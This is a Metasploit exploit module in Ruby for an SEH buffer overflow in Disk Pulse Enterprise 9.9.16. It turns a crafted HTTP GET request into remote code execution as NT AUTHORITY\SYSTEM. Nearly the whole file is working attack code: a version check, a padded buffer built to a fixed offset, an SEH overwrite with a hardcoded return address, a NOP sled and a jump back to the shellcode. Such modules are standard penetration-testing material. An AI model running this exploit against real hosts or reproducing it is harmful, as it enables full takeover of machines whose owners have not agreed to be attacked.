##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Disk Pulse Enterprise GET Buffer Overflow',
      'Description'    => %q(
        This module exploits an SEH buffer overflow in Disk Pulse Enterprise
        9.9.16. If a malicious user sends a crafted HTTP GET request
        it is possible to execute a payload that would run under the Windows
        NT AUTHORITY\SYSTEM account.
      ),
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Chance Johnson', # msf module - albatross@loftwing.net
          'Nipun Jaswal & Anurag Srivastava' # Original discovery -- www.pyramidcyber.com
        ],
      'References'     =>
        [
          [ 'EDB', '42560' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread'
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
          'EncoderType' => "alpha_mixed",
          'BadChars' => "\x00\x0a\x0d\x26"
        },
      'Targets'        =>
        [
          [ 'Disk Pulse Enterprise 9.9.16',
            {
              'Ret' => 0x1013ADDD, # POP EDI POP ESI RET 04 -- libpal.dll
              'Offset' => 2492
            }]
        ],
      'Privileged'     => true,
      'DisclosureDate' => 'Aug 25 2017',
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(80)])
  end

  def check
    res = send_request_cgi(
      'uri'    =>  '/',
      'method' =>  'GET'
    )

    if res && res.code == 200 && res.body =~ /Disk Pulse Enterprise v9\.9\.16/
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    connect

    print_status("Generating exploit...")
    exp = payload.encoded
    exp << 'A' * (target['Offset'] - payload.encoded.length) # buffer of trash until we get to offset
    exp << generate_seh_record(target.ret)
    exp << make_nops(10) # NOP sled to make sure we land on jmp to shellcode
    exp << "\xE9\x25\xBF\xFF\xFF" # jmp 0xffffbf2a - jmp back to shellcode start
    exp << 'B' * (5000 - exp.length) # padding

    print_status("Sending exploit...")

    send_request_cgi(
      'uri' =>  '/../' + exp,
      'method' =>  'GET',
      'host' =>  '4.2.2.2',
      'connection' =>  'keep-alive'
    )

    handler
    disconnect
  end
end